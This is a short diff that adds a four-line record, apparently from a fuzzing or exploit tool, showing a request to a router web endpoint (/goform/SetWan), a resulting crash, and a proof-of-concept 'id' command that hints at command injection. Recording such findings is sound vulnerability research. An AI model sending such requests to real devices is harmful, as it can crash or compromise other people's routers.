@@ -1,0 +1,4 @@
+VERSION: BOND v0.2 (upstream artifact)
+SENT: GET /goform/SetWan?Save=1&Mode=General&MTU=1500
+TRIGGERED:crash
+PoC: id
